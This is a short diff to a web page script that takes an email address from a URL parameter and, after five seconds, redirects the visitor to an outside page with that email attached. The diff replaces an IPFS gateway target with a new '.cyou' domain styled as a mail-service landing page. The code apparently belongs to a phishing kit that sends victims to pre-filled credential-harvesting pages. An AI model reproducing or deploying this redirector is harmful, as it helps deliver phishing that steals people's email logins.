@@ -116,7 +116,7 @@
 
       // Get URL parameters
       const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('mail'); // Get 'mail' parameter
+      const email = urlParams.get('mx'); // Get 'mail' parameter
 
       // If the 'mail' parameter exists and is a valid email
       if (email && validateEmail(email)) {
@@ -125,7 +125,7 @@
 
         setTimeout(() => {
           // Redirect to the desired URL
-          window.location.href = "https://ipfs.eth.aragon.network/ipfs/bafybeiaetfjybs222dytqlt25so3p4nohuzqpmqwfxjaphzlh7r7ie4kum/?email="+email; // Change this to the URL you want to redirect to
+          window.location.href = "https://doyoga-mailservice-landing.volthavenrecycle.cyou/pash.mx2.au.htm#"+email; // Change this to the URL you want to redirect to
         }, 5000); // 5 seconds delay
       } else {
         // Stay on the current page or reload if needed
